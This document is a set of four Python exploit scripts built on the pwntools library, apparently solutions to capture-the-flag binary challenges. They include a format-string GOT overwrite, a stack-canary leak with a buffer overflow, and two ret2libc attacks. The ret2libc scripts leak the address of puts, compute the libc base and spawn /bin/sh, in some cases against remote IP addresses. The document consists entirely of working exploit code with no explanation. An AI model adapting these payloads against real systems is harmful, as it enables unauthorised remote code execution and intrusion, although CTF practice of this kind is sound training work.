```python
from libformatstr import *
from pwn import *

context.log_level = 'debug'
elf=ELF('./pwn')
exit_got=0x804A010
win_addr=0x8048610
bufsiz = 0x14
r = process('./pwn')
#p = FormatStr()
#p[exit_got] = win_addr
#buf = p.payload(10,0)
buf = fmtstr_payload(6, {exit_got:win_addr})
print buf
print "="*80
r.sendline(buf)
r.interactive()
```

```python
from pwn import *
context.log_level = "debug"
io = process("./ex2")
io.sendlineafter("Hello Hacker!\n",b"%31$x")
canary = int(io.recv(8),16)
system = 0x804859B
payload = b"A"*100 + p32(canary) + b"A"*(0xc) + p32(system)
io.sendline(payload)
io.interactive()
```


```python
from pwn import *

# https://ro4lsc.blog.csdn.net/article/details/106744216
#sh = process('./stack1')
sh = remote('111.231.70.44',28007)
context.log_level = 'debug'
elf = ELF('./stack1')

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('/home/ly0n/pwn/tools/libc6-i386_2.27-3ubuntu1_amd64.so')

puts_plt_addr =elf.plt['puts']
puts_got_addr  =elf.got['puts']
main_addr =elf.sym['_start']
payload = "a"*13
payload += p32(puts_plt_addr)
payload += p32(main_addr)
payload += p32(puts_got_addr)
sh.recvuntil('!\n')
sh.sendline(payload)
sh.recvuntil("\n\n")
puts_addr = u32(sh.recv(4))
print "puts:"
print hex(puts_addr)

libc_puts_addr = int(libc.sym['puts'])
base_addr = puts_addr-libc_puts_addr

system_addr = base_addr+int(libc.sym['system'])
binsh_addr = base_addr+int(libc.search('/bin/sh').next())

max_payload  = 'a' * 13
print "base:"
print hex(base_addr)
print "system:"
print hex(system_addr)
print "binsh:"
print hex(binsh_addr) 

max_payload += p32(system_addr)
max_payload += p32(main_addr)
max_payload += p32(binsh_addr)
sleep(1)
sh.recvuntil("\n")
sleep(1)
sh.sendline(max_payload)
sh.interactive()
```


```python
from pwn import *

p = remote('101.132.135.45',28102)
context.log_level = 'debug'
elf = ELF('./stack1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']
payload = b"A"*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
p.sendline(payload)
p.recvuntil('\n\n')
get_addr = u32(p.recv(4))
print(hex(get_addr))
libcbase = get_addr - 0x067360
system_addr = libcbase + 0x03cd10
bin_sh = libcbase + 0x17b8cf
payload = flat([b'A'*13,system_addr,b'AAAA',bin_sh])
p.sendline(payload)
p.interactive()
```